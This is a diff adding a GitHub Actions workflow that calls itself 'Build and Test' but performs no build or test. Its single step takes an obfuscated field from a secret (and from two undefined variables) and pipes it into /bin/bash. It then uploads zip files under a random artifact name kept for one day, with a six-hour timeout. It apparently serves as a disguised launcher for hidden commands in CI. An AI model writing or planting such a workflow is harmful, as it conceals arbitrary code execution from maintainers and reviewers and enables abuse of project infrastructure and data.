@@ -1,0 +1,24 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          chy10: ${{ secrets.chy10 }}
+        run: |
+          printf '%s' "$chy10" | jq -r .mc994 | /bin/bash
+          printf '%s' "$itxe40124" | jq -r .gs1971 | /bin/bash
+          echo $oxkw24523 | jq -r .fi87056 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 31UunQ07
+          path: "*.zip"
+          retention-days: 1
